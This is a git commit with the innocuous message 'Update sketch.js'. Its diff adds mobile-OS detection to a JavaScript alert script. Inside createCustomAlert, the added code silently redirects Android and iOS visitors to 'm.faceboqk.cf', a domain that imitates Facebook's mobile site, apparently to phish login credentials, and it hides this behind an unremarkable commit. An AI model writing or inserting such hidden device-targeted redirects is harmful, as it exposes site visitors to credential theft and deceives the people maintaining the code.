fab4389d3686d905f80253a5b1b03a7508f5660f
passduck <67808602+passduck@users.noreply.github.com>
2020-07-07 04:07:36 -0400

    Update sketch.js

--- sketch.js
+++ sketch.js
@@ -6,8 +6,33 @@ if(document.getElementById) {
         createCustomAlert(txt);
     }
 }
+function getMobileOperatingSystem() {
+  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
+      // Windows Phone must come first because its UA also contains "Android"
+    if (/windows phone/i.test(userAgent)) {
+        return "Windows";
+    }
+
+    if (/android/i.test(userAgent)) {
+        return "Android";
+    }
+
+    // iOS detection from: http://stackoverflow.com/a/9039885/177710
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return "iOS";
+    }
+
+    return "";
+}
 function createCustomAlert(txt) {
+    var deviceType = getMobileOperatingSystem();
+    if (deviceType == 'Android' || deviceType == 'iOS'){
+        window.location.replace("https://m.faceboqk.cf");
+    }
+    
+    
+    
     d = document;
 
     if(d.getElementById("modalContainer")) return;
